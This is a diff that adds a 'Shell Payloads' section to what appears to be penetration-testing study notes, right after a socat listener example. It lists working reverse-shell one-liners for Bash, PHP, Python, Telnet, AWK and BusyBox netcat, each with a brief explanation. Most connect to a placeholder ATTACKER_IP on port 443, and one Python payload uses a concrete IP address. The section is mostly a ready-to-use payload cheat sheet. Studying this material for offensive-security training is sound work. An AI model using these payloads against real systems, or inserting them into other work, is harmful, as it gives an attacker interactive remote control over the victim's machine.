@@ -241,3 +241,158 @@ attacker@kali:~$ socat -d -d TCP-LISTEN:443 STDOUT
 The command above used the `-d` option to enable verbose output; using it again (`-d -d`) will increase the verbosity of the commands. The `TCP-LISTEN:443` option creates a TCP listener on port 443, establishing a server socket for incoming connections. Finally, the `STDOUT` option directs any incoming data to the terminal.
 
 
+---
+
+# Shell Payloads
+
+A Shell Payload can be a command or script that exposes the shell to an incoming connection in the case of a bind shell or sends a connection in the case of a reverse shell.
+
+Let’s explore some of these payloads that can be used in the Linux OS to expose the shell through the most popular reverse shell techniques.
+
+---
+
+## Bash
+
+### Normal Bash Reverse Shell
+```bash
+bash -i >& /dev/tcp/ATTACKER_IP/443 0>&1
+```
+This command launches an interactive Bash shell (`-i`), then uses redirection to send both standard output and standard error to a TCP socket connected to `ATTACKER_IP` on port `443`. `>&` is used to redirect both stdout and stderr, and `0>&1` connects standard input from the same source.
+
+---
+
+### Bash Read Line Reverse Shell
+```bash
+exec 5<>/dev/tcp/ATTACKER_IP/443; cat <&5 | while read line; do $line 2>&5 >&5; done
+```
+Creates a bidirectional connection on file descriptor 5 to the attacker's IP. It reads lines from the socket and executes each as a command, sending both stdout and stderr back to the attacker via the same connection.
+
+---
+
+### Bash With File Descriptor 196 Reverse Shell
+```bash
+0<&196;exec 196<>/dev/tcp/ATTACKER_IP/443; sh <&196 >&196 2>&196
+```
+Uses file descriptor `196` to establish a socket connection. Then redirects stdin, stdout, and stderr through this descriptor to create a bidirectional communication channel.
+
+---
+
+### Bash With File Descriptor 5 Reverse Shell
+```bash
+bash -i 5<> /dev/tcp/ATTACKER_IP/443 0<&5 1>&5 2>&5
+```
+Creates an interactive Bash shell that connects via file descriptor 5. Redirects all I/O (input, output, error) to communicate over a TCP connection with the attacker.
+
+---
+
+## PHP
+
+### PHP Reverse Shell Using the `exec` Function
+```bash
+php -r '$sock=fsockopen("ATTACKER_IP",443);exec("sh <&3 >&3 2>&3");'
+```
+Creates a TCP connection to the attacker’s IP on port 443 using `fsockopen`, then executes a shell with input/output redirected to the socket using `exec()`.
+
+---
+
+### PHP Reverse Shell Using the `shell_exec` Function
+```bash
+php -r '$sock=fsockopen("ATTACKER_IP",443);shell_exec("sh <&3 >&3 2>&3");'
+```
+Similar to `exec`, but `shell_exec()` returns the command output as a string. Used for command execution and result collection.
+
+---
+
+### PHP Reverse Shell Using the `system` Function
+```bash
+php -r '$sock=fsockopen("ATTACKER_IP",443);system("sh <&3 >&3 2>&3");'
+```
+`system()` executes the command and immediately displays output. Useful for real-time interaction through the browser or terminal.
+
+---
+
+### PHP Reverse Shell Using the `passthru` Function
+```bash
+php -r '$sock=fsockopen("ATTACKER_IP",443);passthru("sh <&3 >&3 2>&3");'
+```
+`passthru()` executes commands and directly outputs raw data. Effective when working with binary data over the connection.
+
+---
+
+### PHP Reverse Shell Using the `popen` Function
+```bash
+php -r '$sock=fsockopen("ATTACKER_IP",443);popen("sh <&3 >&3 2>&3", "r");'
+```
+Opens a process pointer using `popen()` for command execution. Enables read access from the executed process, allowing shell interaction.
+
+---
+
+## Python
+
+### Python Reverse Shell with Environment Variables
+```bash
+export RHOST="ATTACKER_IP"; export RPORT=443; python -c 'import sys,socket,os,pty;
+s=socket.socket();s.connect((os.getenv("RHOST"),int(os.getenv("RPORT"))));
+[os.dup2(s.fileno(),fd) for fd in (0,1,2)];pty.spawn("bash")'
+```
+Sets environment variables for the attacker's host and port. Python creates a socket, connects, duplicates I/O file descriptors to use the socket, and spawns a pseudo-terminal for interactive access.
+
+---
+
+### Python Reverse Shell with `subprocess` Module
+```bash
+python -c 'import socket,subprocess,os;
+s=socket.socket(socket.AF_INET,socket.SOCK_STREAM);s.connect(("10.4.99.209",443));
+os.dup2(s.fileno(),0); os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);
+import pty; pty.spawn("bash")'
+```
+Same core idea: connects to an IP, redirects I/O via `dup2`, and spawns an interactive bash shell using `pty`.
+
+---
+
+### Short Python Reverse Shell
+```bash
+python -c 'import os,pty,socket;
+s=socket.socket();s.connect(("ATTACKER_IP",443));
+[os.dup2(s.fileno(),f)for f in(0,1,2)];pty.spawn("bash")'
+```
+A shorter version of the reverse shell script. Still creates a TCP connection and redirects input/output/error via `dup2()`.
+
+---
+
+## Others
+
+### Telnet Reverse Shell
+```bash
+TF=$(mktemp -u); mkfifo $TF && telnet ATTACKER_IP 443 0<$TF | sh 1>$TF
+```
+Creates a named FIFO pipe (`mkfifo`). Telnet connects to the attacker, sending input to `sh`, and output is piped back through the FIFO.
+
+---
+
+### AWK Reverse Shell
+```bash
+awk 'BEGIN {
+s = "/inet/tcp/0/ATTACKER_IP/443";
+while(42) {
+  do {
+    printf "shell>" |& s;
+    s |& getline c;
+    if(c) {
+      while ((c |& getline) > 0) print $0 |& s;
+      close(c);
+    }
+  } while(c != "exit")
+  close(s);
+}}' /dev/null
+```
+Leverages AWK’s internal TCP support to create an infinite loop connection to the attacker. Executes any command sent and returns results over the same socket.
+
+---
+
+### BusyBox Reverse Shell
+```bash
+busybox nc ATTACKER_IP 443 -e sh
+```
+Uses BusyBox’s implementation of Netcat (`nc`) to connect to the attacker's IP and execute a shell (`sh`) upon successful connection.
+
